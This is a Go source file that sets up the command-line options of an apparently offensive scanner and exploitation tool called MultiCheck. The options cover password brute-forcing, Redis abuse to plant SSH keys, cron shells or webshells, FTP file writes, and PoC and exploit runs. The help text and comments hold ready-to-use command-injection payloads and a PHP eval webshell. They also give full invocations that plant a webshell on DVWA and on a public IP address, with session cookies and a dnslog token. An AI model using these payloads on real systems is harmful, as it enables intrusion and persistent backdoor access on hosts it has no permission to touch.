package flag_cli

import (
	"flag"
	"github.com/nerowander/MultiCheck/common"
	"github.com/nerowander/MultiCheck/config"
)

func Execute(infoScan *config.InfoScan) {
	flag.IntVar(&config.Threads, "t", 500, "The nums of thread")
	flag.StringVar(&config.ScanType, "st", "all", "choose scan type, for example: web | all | pocscan | exploit | ping | portscan")
	flag.Int64Var(&config.Timeout, "to", 3, "set the InfoScan timeout")
	flag.StringVar(&config.Command, "c", "", "exec command, for example: ssh")
	flag.StringVar(&infoScan.Hosts, "h", "", "IP address to scan, for example: 192.168.0.1 | 1.2.3.4/24 | 192.168.0.1,192.168.0.2 | 1.2.3.4-255 | 1.2.3.4-1.2.3.255")
	flag.StringVar(&config.Ports, "p", config.DefaultPorts, "Port to scan, for example: 80 | 80,443 | 80-443")
	flag.StringVar(&config.URL, "u", "", "url to scan")
	flag.StringVar(&config.URLFile, "uf", "", "choose url file to scan")
	flag.StringVar(&config.AddPorts, "ap", "", "add extra ports,-pa 2333")
	flag.StringVar(&config.AddUserNames, "au", "", "add extra username,-au admin")
	flag.StringVar(&config.AddPassWords, "apw", "", "add extra password,-apw admin")
	flag.StringVar(&config.Hash, "hash", "", "input hash")
	flag.StringVar(&config.HostFile, "hf", "", "select host file to scan")
	flag.StringVar(&config.PortsFile, "pf", "", "select port file to scan")
	flag.BoolVar(&infoScan.Brute, "br", true, "Brute password or not")
	flag.StringVar(&infoScan.FTPReadFile, "ftprf", "", "choose a file to read in ftp server")
	flag.StringVar(&infoScan.FTPWriteFile, "ftpwf", "", "choose a file to write in ftp server")
	flag.StringVar(&infoScan.Domain, "domain", "", "smb | rdp domain")
	flag.BoolVar(&infoScan.SkipRedis, "skipredis", false, "skip redis exploit")
	flag.StringVar(&infoScan.RedisSshFile, "rf", "", "redis file to write sshkey file, for example: id_rsa.pub)")
	flag.StringVar(&infoScan.RedisCronHost, "rs", "", "redis shell to write cron file for example: 192.168.1.1:2333)")
	flag.StringVar(&infoScan.RedisWebshellFile, "rw", "", "redis file to write webshell file, for example: shell.php")
	flag.IntVar(&config.BruteThreads, "bt", 1, "The nums of thread to brute")
	flag.StringVar(&config.PocPath, "pocpath", "", "poc file path")
	flag.StringVar(&infoScan.RemotePath, "rp", "", "remote path of the target, for example: FastCGI filepath")
	flag.StringVar(&config.Cookie, "cookie", "", "set cookie")
	flag.Int64Var(&config.WebTimeout, "wto", 5, "set the Webclient timeout")
	flag.StringVar(&config.Username, "username", "", "username account, for example: admin| admin,test")
	flag.StringVar(&config.UsernameFile, "userfile", "", "username file")
	flag.StringVar(&config.Password, "password", "", "password, for example: admin| admin,test")
	flag.StringVar(&config.PasswordFile, "passfile", "", "password file")
	flag.StringVar(&config.HashFile, "hashfile", "", "hash file")
	//flag.BoolVar(&infoScan.Ping, "ping", false, "choose ping or icmp: false->icmp, true->ping")
	flag.StringVar(&infoScan.SshKey, "sshkey", "", "sshkey file (id_rsa)")
	flag.IntVar(&config.PocNum, "pocn", 20, "poc rate")
	flag.StringVar(&config.PocName, "pocname", "", "choose poc name to scan, such as: sql")
	flag.StringVar(&config.PocType, "poctype", "all", "choose poc type: base(such as sql injection scan) | software (OA CMS scan) | iot(IOT scan) | all(web+iot scan)")
	flag.BoolVar(&config.DnsLog, "dnslog", false, "enable ceye dnslog, then provide your ceye token and ceye url: -ct <token> -cu <ceye_url>")
	flag.StringVar(&config.CeyeToken, "ct", "", "ceye token")
	flag.StringVar(&config.CeyeURL, "cu", "", "ceye url")
	flag.BoolVar(&config.FullPOC, "fpoc", false, "poc full scan,as: use all shiro keys to scan")
	flag.BoolVar(&config.FullEXP, "fexp", false, "exp full scan,as: use all shiro keys to scan")
	flag.IntVar(&config.ExpNum, "expn", 20, "exp rate")
	flag.StringVar(&config.ExpPath, "exppath", "", "exp file path")
	flag.StringVar(&config.ExpType, "exptype", "all", "choose exp type: base(such as sql injection exploit) | software (OA CMS exploit) | iot(IOT exploit) | all(web+iot exploit)")
	flag.StringVar(&config.ExpName, "expname", "", "choose poc name to scan, such as: sql")
	flag.Int64Var(&common.LogWaitTime, "waittime", 60, "Logerr wait time")
	flag.BoolVar(&common.PrintLog, "printlog", true, "print scan log")
	flag.BoolVar(&config.SaveResult, "save", true, "save scan result to log file: json| html | txt(default)")
	flag.StringVar(&config.OutPutFile, "of", config.DefaultOutputFile, "output log file name")
	flag.BoolVar(&common.SaveLogToJSON, "json", false, "save log to json file")
	flag.BoolVar(&common.SaveLogToHTML, "html", false, "save log to html file")
	//flag.BoolVar(&config.EnableContainer, "ec", false, "Enable docker container to run scan")
	flag.StringVar(&config.RequestPath, "requestpath", "", "choose request path, for example: api/v1")
	flag.StringVar(&config.RequestBody, "requestbody", "", "choose request body, for example: a=1&b=2")
	flag.StringVar(&config.PocBody, "pocbody", "", "used for base poc, choose the poc request body, for example: 127.0.0.1&&whoami")
	flag.StringVar(&config.CheckPocResBody, "checkpocresbody", "", "used for base poc, choose the poc check response body, for example: root")
	flag.StringVar(&config.WriteWebShellBody, "writewebshellbody", "", "used for base exp, choose the exp to write webshell, for example: echo '<?php @eval($_GET[\"pass\"]);?>' > 1.php")
	flag.StringVar(&config.CheckExpResBody, "checkexpresbody", "", "used for base exp, choose the exp check response body, for example: root")
	flag.StringVar(&config.CheckWebshellPath, "checkwebshellpath", "", "used for base exp, choose the webshell path, for example: 1.php")
	flag.StringVar(&config.WebShellCommand, "webshellcommand", "", "used for base exp, choose the command to execute in webshell, for example: pass=phpinfo();")
	flag.StringVar(&config.CheckWebShellCmdBody, "checkwebshellcmdbody", "", "used for base exp, choose the command execute in res body, for example: PHP Version")
	flag.BoolVar(&config.EnableInfoContainer, "enic", false, "enable infoscan module container")
	// 记得命令行交互页面加上这两个变量
	// -u http://47.103.86.115:8080 -requestpath vulnerabilities/exec/ -pocbody 'ip=127.0.0.1+%26%26+whoami&Submit=Submit' -cookie 'PHPSESSID=35eb962161b9e9bb0f97a3c7a0d620cf; security=low' -checkpocresbody 'www-data' -st pocscan -save=false -pocname command -poctype base

	//-st exploit -exptype software -ct f0f8c3cb48f51c0038f724081f08fa1c -cu 8lxlel.ceye.io -save=false -wto 30
	// 127.0.0.1+%26%26+echo'<?php%20@eval($_GET["pass"]);?>'>../../2.php+&&+ls
	//  -u http://47.103.86.115:8080 --requestpath vulnerabilities/exec/ -writewebshellbody '127.0.0.1+%26%26+echo'<?php%20@eval($_GET["pass"]);?>'>../../test1.php+&&+ls' -cookie 'PHPSESSID=35eb962161b9e9bb0f97a3c7a0d620cf; security=low' -checkexpresbody 'index.php' -checkwebshellpath test1.php -webshellcommand "pass=phpinfo();" -checkwebshellcmdbody 'PHP Version' -st exploit -save=false -expname command -exptype base
	// -u http://47.103.86.115:8080 -requestpath vulnerabilities/exec/ -writewebshellbody "ip=127.0.0.1+%26%26+echo%27<?php%20@eval($_GET[\"pass\"]);?>%27>../../test1.php+%26%26+ls&Submit=Submit" -cookie 'PHPSESSID=35eb962161b9e9bb0f97a3c7a0d620cf; security=low' -checkexpresbody 'index.php' -checkwebshellpath test1.php -webshellcommand "pass=phpinfo();" -checkwebshellcmdbody 'PHP Version' -st exploit -save=false -expname command -exptype base

	// low dvwa poc
	// -u http://127.0.0.1:8080 --requestpath vulnerabilities/exec/ -pocbody 'ip=127.0.0.1+%26%26+whoami&Submit=Submit' -cookie 'PHPSESSID=35eb962161b9e9bb0f97a3c7a0d620cf; security=low' -checkpocresbody 'www-data' -st pocscan -save=false -pocname command -poctype base
	// medium dvwa poc
	// -u http://127.0.0.1:8080 --requestpath vulnerabilities/exec/ -pocbody 'ip=127.0.0.1+%26;%26+whoami&Submit=Submit' -cookie 'PHPSESSID=35eb962161b9e9bb0f97a3c7a0d620cf; security=medium' -checkpocresbody 'www-data' -st pocscan -save=false -pocname command -poctype base
	// low dvwa exp
	// -u http://127.0.0.1:8080 -requestpath vulnerabilities/exec/ -writewebshellbody "ip=127.0.0.1+%26%26+echo+%27%3C%3Fphp+%40eval%28%24_POST%5B%22pass%22%5D%29%3B%3F%3E%27%3E..%2F..%2F111.php+%26%26+ls&Submit=Submit" -cookie 'PHPSESSID=35eb962161b9e9bb0f97a3c7a0d620cf; security=low' -checkexpresbody 'index.php' -checkwebshellpath 111.php -webshellcommand "pass=phpinfo();" -checkwebshellcmdbody 'PHP Version' -st exploit -save=false -expname command -exptype base
	// medium dvwa exp
	// -u http://127.0.0.1:8080 -requestpath vulnerabilities/exec/ -writewebshellbody "ip=127.0.0.1+%26%3B%26+echo+%27%3C%3Fphp+%40eval%28%24_POST%5B%22pass%22%5D%29%3B%3F%3E%27%3E..%2F..%2F222.php+%26%3B%26+ls&Submit=Submit" -cookie 'PHPSESSID=35eb962161b9e9bb0f97a3c7a0d620cf; security=medium' -checkexpresbody 'index.php' -checkwebshellpath 222.php -webshellcommand "pass=phpinfo();" -checkwebshellcmdbody 'PHP Version' -st exploit -save=false -expname command -exptype base
	flag.Parse()

}
